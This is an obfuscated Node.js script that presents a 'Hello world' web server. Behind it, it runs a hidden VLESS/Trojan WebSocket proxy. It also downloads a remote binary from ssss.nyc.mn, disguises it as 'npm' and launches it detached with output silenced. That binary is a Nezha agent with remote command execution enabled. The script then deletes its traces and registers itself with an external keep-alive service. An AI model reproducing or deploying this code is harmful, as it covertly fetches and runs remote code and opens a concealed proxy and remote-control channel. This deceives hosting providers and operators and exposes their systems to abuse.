const _0x2bf2=['from','Server\x20is\x20running\x20on\x20port\x20','NEZHA_KEY','concat','https://','substr','\x20with\x20all\x20DNS\x20servers','DOMAIN','https://api.ip.sb/geoip','update','axios','https://oooo.serv00.net/add-url','utf8','https://arm64.ssss.nyc.mn/v1','https://amd64.ssss.nyc.mn/v1','2096','/bin/bash','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','send','npm','get','utf-8','pipe','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20-p\x20',':443?encryption=none&security=tls&sni=','error:\x20','1.1.1.1','pop','setsid\x20nohup\x20./npm\x20-s\x20','path','connect','length','toString','readUInt16BE','&path=%2F','error','npm\x20is\x20already\x20running,\x20skip\x20running...','--tls','2053','Not\x20Found\x0a','slice','vless://','url','PORT','map','unlink','sub','split','includes','false','https://dns.google/resolve?name=','close','writeHead','443','arm64','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','join','UUID','every','crypto','Answer','post','reduce','env','SUB_PATH','sha224','Unknown','log','then','application/json','once','base64','AUTO_ACCESS','replace','readUInt8','readFile','aarch64','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','end','text/plain','client_secret:\x20','Server','country_code','message','Status','write','data','catch','test'];const _0x36cc=function(_0x2bf277,_0x36cc94){_0x2bf277=_0x2bf277-0x0;let _0x578bfe=_0x2bf2[_0x2bf277];return _0x578bfe;};const os=require('os');const http=require('http');const fs=require('fs');const axios=require(_0x36cc('0xa'));const net=require('net');const path=require(_0x36cc('0x1e'));const crypto=require(_0x36cc('0x3c'));const {Buffer}=require('buffer');const {exec,execSync}=require('child_process');const {WebSocket,createWebSocketStream}=require('ws');const UUID=process['env'][_0x36cc('0x3a')]||'69c31e4a-5fa4-469d-b1e4-890681914535';const NEZHA_SERVER=process['env']['NEZHA_SERVER']||'';const NEZHA_PORT=process[_0x36cc('0x40')]['NEZHA_PORT']||'';const NEZHA_KEY=process[_0x36cc('0x40')][_0x36cc('0x2')]||'';const DOMAIN=process['env'][_0x36cc('0x7')]||'1234.abc.com';const AUTO_ACCESS=process['env'][_0x36cc('0x49')]||!![];const WSPATH=process[_0x36cc('0x40')]['WSPATH']||UUID[_0x36cc('0x29')](0x0,0x8);const SUB_PATH=process[_0x36cc('0x40')][_0x36cc('0x41')]||_0x36cc('0x2f');const NAME=process['env']['NAME']||'';const PORT=process[_0x36cc('0x40')][_0x36cc('0x2c')]||0x1eb4;let ISP='';const GetISP=async()=>{try{const _0x34bb07=await axios['get'](_0x36cc('0x8'));const _0x6c5600=_0x34bb07['data'];ISP=(_0x6c5600[_0x36cc('0x53')]+'-'+_0x6c5600['isp'])[_0x36cc('0x4a')](/ /g,'_');}catch(_0xba0f32){ISP=_0x36cc('0x43');}};GetISP();const httpServer=http['createServer']((_0x41ea1b,_0x4e398f)=>{if(_0x41ea1b[_0x36cc('0x2b')]==='/'){const _0x563fef=path[_0x36cc('0x39')](__dirname,'index.html');fs[_0x36cc('0x4c')](_0x563fef,_0x36cc('0xc'),(_0x17b5d2,_0x585f5f)=>{if(_0x17b5d2){_0x4e398f['writeHead'](0xc8,{'Content-Type':'text/html'});_0x4e398f['end']('Hello\x20world!');return;}_0x4e398f[_0x36cc('0x35')](0xc8,{'Content-Type':'text/html'});_0x4e398f['end'](_0x585f5f);});return;}else if(_0x41ea1b['url']==='/'+SUB_PATH){const _0x1c092e=NAME?NAME+'-'+ISP:ISP;const _0x10638c=_0x36cc('0x2a')+UUID+'@'+DOMAIN+_0x36cc('0x19')+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x36cc('0x23')+WSPATH+'#'+_0x1c092e;const _0x1638b='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x36cc('0x23')+WSPATH+'#'+_0x1c092e;const _0x106250=_0x10638c+'\x0a'+_0x1638b;const _0x216616=Buffer[_0x36cc('0x0')](_0x106250)['toString'](_0x36cc('0x48'));_0x4e398f['writeHead'](0xc8,{'Content-Type':_0x36cc('0x50')});_0x4e398f[_0x36cc('0x4f')](_0x216616+'\x0a');}else{_0x4e398f['writeHead'](0x194,{'Content-Type':_0x36cc('0x50')});_0x4e398f[_0x36cc('0x4f')](_0x36cc('0x28'));}});const wss=new WebSocket[(_0x36cc('0x52'))]({'server':httpServer});const uuid=UUID['replace'](/-/g,'');const DNS_SERVERS=['8.8.4.4',_0x36cc('0x1b')];function resolveHost(_0x1e3b7c){return new Promise((_0x55e617,_0x538452)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x36cc('0x59')](_0x1e3b7c)){_0x55e617(_0x1e3b7c);return;}let _0xf5f91b=0x0;function _0x22a471(){if(_0xf5f91b>=DNS_SERVERS['length']){_0x538452(new Error('Failed\x20to\x20resolve\x20'+_0x1e3b7c+_0x36cc('0x6')));return;}const _0x19d22c=DNS_SERVERS[_0xf5f91b];_0xf5f91b++;const _0x33a8e0=_0x36cc('0x33')+encodeURIComponent(_0x1e3b7c)+'&type=A';axios['get'](_0x33a8e0,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x36cc('0x45')](_0x5789eb=>{const _0x165ae4=_0x5789eb[_0x36cc('0x57')];if(_0x165ae4[_0x36cc('0x55')]===0x0&&_0x165ae4['Answer']&&_0x165ae4['Answer'][_0x36cc('0x20')]>0x0){const _0x539264=_0x165ae4[_0x36cc('0x3d')]['find'](_0x345f79=>_0x345f79['type']===0x1);if(_0x539264){_0x55e617(_0x539264['data']);return;}}_0x22a471();})[_0x36cc('0x58')](_0x4b6ef5=>{_0x22a471();});}_0x22a471();});}function handleVlessConnection(_0x39be44,_0x398c37){const [_0x4645f1]=_0x398c37;const _0xe422f2=_0x398c37['slice'](0x1,0x11);if(!_0xe422f2[_0x36cc('0x3b')]((_0x490230,_0x3d5ab3)=>_0x490230==parseInt(uuid['substr'](_0x3d5ab3*0x2,0x2),0x10)))return![];let _0x4fb7db=_0x398c37['slice'](0x11,0x12)[_0x36cc('0x4b')]()+0x13;const _0x7a8e8c=_0x398c37[_0x36cc('0x29')](_0x4fb7db,_0x4fb7db+=0x2)[_0x36cc('0x22')](0x0);const _0x50fe5a=_0x398c37[_0x36cc('0x29')](_0x4fb7db,_0x4fb7db+=0x1)[_0x36cc('0x4b')]();const _0x318dbe=_0x50fe5a==0x1?_0x398c37[_0x36cc('0x29')](_0x4fb7db,_0x4fb7db+=0x4)[_0x36cc('0x39')]('.'):_0x50fe5a==0x2?new TextDecoder()['decode'](_0x398c37['slice'](_0x4fb7db+0x1,_0x4fb7db+=0x1+_0x398c37[_0x36cc('0x29')](_0x4fb7db,_0x4fb7db+0x1)[_0x36cc('0x4b')]())):_0x50fe5a==0x3?_0x398c37['slice'](_0x4fb7db,_0x4fb7db+=0x10)[_0x36cc('0x3f')]((_0x2af73f,_0x514e06,_0x507c04,_0x4463fd)=>_0x507c04%0x2?_0x2af73f[_0x36cc('0x3')](_0x4463fd[_0x36cc('0x29')](_0x507c04-0x1,_0x507c04+0x1)):_0x2af73f,[])[_0x36cc('0x2d')](_0x281d38=>_0x281d38[_0x36cc('0x22')](0x0)['toString'](0x10))[_0x36cc('0x39')](':'):'';_0x39be44[_0x36cc('0x12')](new Uint8Array([_0x4645f1,0x0]));const _0x183139=createWebSocketStream(_0x39be44);resolveHost(_0x318dbe)['then'](_0x45d97f=>{net[_0x36cc('0x1f')]({'host':_0x45d97f,'port':_0x7a8e8c},function(){this['write'](_0x398c37['slice'](_0x4fb7db));_0x183139['on']('error',()=>{})['pipe'](this)['on'](_0x36cc('0x24'),()=>{})[_0x36cc('0x16')](_0x183139);})['on'](_0x36cc('0x24'),()=>{});})['catch'](_0x13b46e=>{net[_0x36cc('0x1f')]({'host':_0x318dbe,'port':_0x7a8e8c},function(){this[_0x36cc('0x56')](_0x398c37['slice'](_0x4fb7db));_0x183139['on'](_0x36cc('0x24'),()=>{})['pipe'](this)['on'](_0x36cc('0x24'),()=>{})[_0x36cc('0x16')](_0x183139);})['on'](_0x36cc('0x24'),()=>{});});return!![];}function handleTrojanConnection(_0x41865f,_0x3dbd56){try{if(_0x3dbd56[_0x36cc('0x20')]<0x3a)return![];const _0x774706=_0x3dbd56['slice'](0x0,0x38)[_0x36cc('0x21')]();const _0x591839=[UUID];let _0x232056=null;for(const _0x58064f of _0x591839){const _0x4671f9=crypto['createHash'](_0x36cc('0x42'))[_0x36cc('0x9')](_0x58064f)['digest']('hex');if(_0x4671f9===_0x774706){_0x232056=_0x58064f;break;}}if(!_0x232056)return![];let _0x49e195=0x38;if(_0x3dbd56[_0x49e195]===0xd&&_0x3dbd56[_0x49e195+0x1]===0xa){_0x49e195+=0x2;}const _0x5d722c=_0x3dbd56[_0x49e195];if(_0x5d722c!==0x1)return![];_0x49e195+=0x1;const _0x3aa7ab=_0x3dbd56[_0x49e195];_0x49e195+=0x1;let _0x288f97,_0x309d71;if(_0x3aa7ab===0x1){_0x288f97=_0x3dbd56[_0x36cc('0x29')](_0x49e195,_0x49e195+0x4)[_0x36cc('0x39')]('.');_0x49e195+=0x4;}else if(_0x3aa7ab===0x3){const _0x313cfa=_0x3dbd56[_0x49e195];_0x49e195+=0x1;_0x288f97=_0x3dbd56['slice'](_0x49e195,_0x49e195+_0x313cfa)['toString']();_0x49e195+=_0x313cfa;}else if(_0x3aa7ab===0x4){_0x288f97=_0x3dbd56[_0x36cc('0x29')](_0x49e195,_0x49e195+0x10)['reduce']((_0x4f0172,_0x4514d9,_0x1d7092,_0x7b183f)=>_0x1d7092%0x2?_0x4f0172['concat'](_0x7b183f[_0x36cc('0x29')](_0x1d7092-0x1,_0x1d7092+0x1)):_0x4f0172,[])[_0x36cc('0x2d')](_0x260382=>_0x260382['readUInt16BE'](0x0)['toString'](0x10))['join'](':');_0x49e195+=0x10;}else{return![];}_0x309d71=_0x3dbd56['readUInt16BE'](_0x49e195);_0x49e195+=0x2;if(_0x49e195<_0x3dbd56['length']&&_0x3dbd56[_0x49e195]===0xd&&_0x3dbd56[_0x49e195+0x1]===0xa){_0x49e195+=0x2;}const _0x30e58f=createWebSocketStream(_0x41865f);resolveHost(_0x288f97)['then'](_0x53dd47=>{net['connect']({'host':_0x53dd47,'port':_0x309d71},function(){if(_0x49e195<_0x3dbd56[_0x36cc('0x20')]){this['write'](_0x3dbd56[_0x36cc('0x29')](_0x49e195));}_0x30e58f['on']('error',()=>{})[_0x36cc('0x16')](this)['on'](_0x36cc('0x24'),()=>{})['pipe'](_0x30e58f);})['on']('error',()=>{});})['catch'](_0x4a592e=>{net['connect']({'host':_0x288f97,'port':_0x309d71},function(){if(_0x49e195<_0x3dbd56['length']){this['write'](_0x3dbd56['slice'](_0x49e195));}_0x30e58f['on'](_0x36cc('0x24'),()=>{})[_0x36cc('0x16')](this)['on'](_0x36cc('0x24'),()=>{})['pipe'](_0x30e58f);})['on'](_0x36cc('0x24'),()=>{});});return!![];}catch(_0x42a941){return![];}}wss['on']('connection',(_0x35e15b,_0x350ebf)=>{const _0x35106a=_0x350ebf['url']||'';_0x35e15b[_0x36cc('0x47')](_0x36cc('0x54'),_0x1ca7c5=>{if(_0x1ca7c5['length']>0x11&&_0x1ca7c5[0x0]===0x0){const _0x5cbf88=_0x1ca7c5[_0x36cc('0x29')](0x1,0x11);const _0x23702f=_0x5cbf88[_0x36cc('0x3b')]((_0x28763c,_0x5b5daa)=>_0x28763c==parseInt(uuid[_0x36cc('0x5')](_0x5b5daa*0x2,0x2),0x10));if(_0x23702f){if(!handleVlessConnection(_0x35e15b,_0x1ca7c5)){_0x35e15b['close']();}return;}}if(!handleTrojanConnection(_0x35e15b,_0x1ca7c5)){_0x35e15b[_0x36cc('0x34')]();}})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x48e59a=os['arch']();if(_0x48e59a==='arm'||_0x48e59a===_0x36cc('0x37')||_0x48e59a===_0x36cc('0x4d')){if(!NEZHA_PORT){return _0x36cc('0xd');}else{return'https://arm64.ssss.nyc.mn/agent';}}else{if(!NEZHA_PORT){return _0x36cc('0xe');}else{return'https://amd64.ssss.nyc.mn/agent';}}};const downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x375a59=getDownloadUrl();const _0x21b8a6=await axios({'method':_0x36cc('0x14'),'url':_0x375a59,'responseType':'stream'});const _0x58bb6f=fs['createWriteStream'](_0x36cc('0x13'));_0x21b8a6['data'][_0x36cc('0x16')](_0x58bb6f);return new Promise((_0x49c958,_0x81bbe7)=>{_0x58bb6f['on']('finish',()=>{console[_0x36cc('0x44')]('npm\x20download\x20successfully');exec('chmod\x20+x\x20npm',_0x4fbbfa=>{if(_0x4fbbfa)_0x81bbe7(_0x4fbbfa);_0x49c958();});});_0x58bb6f['on'](_0x36cc('0x24'),_0x81bbe7);});}catch(_0x40bffa){throw _0x40bffa;}};const runnz=async()=>{try{const _0x3937d9=execSync(_0x36cc('0x4e'),{'encoding':_0x36cc('0x15')});if(_0x3937d9['trim']()!==''){console['log'](_0x36cc('0x25'));return;}}catch(_0x46b21b){}await downloadFile();let _0x40d6e0='';let _0x18f891=[_0x36cc('0x36'),'8443',_0x36cc('0xf'),'2087','2083',_0x36cc('0x27')];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x197192=_0x18f891[_0x36cc('0x31')](NEZHA_PORT)?_0x36cc('0x26'):'';_0x40d6e0=_0x36cc('0x1d')+NEZHA_SERVER+':'+NEZHA_PORT+_0x36cc('0x18')+NEZHA_KEY+'\x20'+_0x197192+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x9bf3d7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x36cc('0x30')](':')[_0x36cc('0x1c')]():'';const _0x2c2836=_0x18f891[_0x36cc('0x31')](_0x9bf3d7)?'true':_0x36cc('0x32');const _0x303e48=_0x36cc('0x51')+NEZHA_KEY+_0x36cc('0x17')+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x2c2836+_0x36cc('0x11')+UUID;fs['writeFileSync']('config.yaml',_0x303e48);}_0x40d6e0='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x36cc('0x44')](_0x36cc('0x38'));return;}try{exec(_0x40d6e0,{'shell':_0x36cc('0x10')},_0x2a0d78=>{if(_0x2a0d78)console[_0x36cc('0x24')]('npm\x20running\x20error:',_0x2a0d78);else console[_0x36cc('0x44')]('npm\x20is\x20running');});}catch(_0x5c4200){console[_0x36cc('0x24')](_0x36cc('0x1a')+_0x5c4200);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN){return;}const _0x4c2eb6=_0x36cc('0x4')+DOMAIN;try{const _0x5f4eeb=await axios[_0x36cc('0x3e')](_0x36cc('0xb'),{'url':_0x4c2eb6},{'headers':{'Content-Type':_0x36cc('0x46')}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x1668d1){}}const delFiles=()=>{fs[_0x36cc('0x2e')](_0x36cc('0x13'),()=>{});fs[_0x36cc('0x2e')]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz();setTimeout(()=>{delFiles();},0x2bf20);addAccessTask();console['log'](_0x36cc('0x1')+PORT);});
